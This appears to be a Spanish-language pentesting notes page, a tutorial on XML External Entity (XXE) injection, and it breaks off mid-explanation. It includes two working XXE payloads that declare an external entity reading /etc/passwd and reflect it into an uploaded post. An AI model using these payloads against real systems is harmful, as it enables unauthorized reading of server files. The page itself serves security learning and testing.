---
icon: file-xml
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# XXE Injection

URL = [Info XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

Supongamos que tenemos una web en la que podemos subir cosas en formato `xml` y que la estructura la procesa bien mostrandonos asi el input que nosotros hemos metido, si se fia de cualquier input que le podamos meter, podremos hacer la inyeccion `XXE`...

Supongamos que la estructura del `xml` es la siguiente...

```xml
<post>
	<title>test</title>
	<description>message test</description>
	<markdown>test test test</markdown>
</post>
```

Y ese input se refleja en la pagina cuando lo vamos a subir, por lo que podremos hacer lo siguiente...

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<post>
	<title>test</title>
	<description>message test</description>
	<markdown>&xxe;</markdown>
</post>
```

Si es vulnerable a este tipo de inyeccion deberiamos de poder ver el archivo `passwd` en el espacio donde estamos poniendo `&xxe;` y este nombre puede ser cualquiera que le queramos asignar en la parte de arriba en la zona `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>` donde pone `xxe` podemos nombrarlo como queramos por ejemplo...

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY example SYSTEM "file:///etc/passwd" >]>
<post>
	<title>test</title>
	<description>message test</description>
	<markdown>&example;</markdown>
</post>
```

Si le cambiamos el nombre quedaria de esta manera...
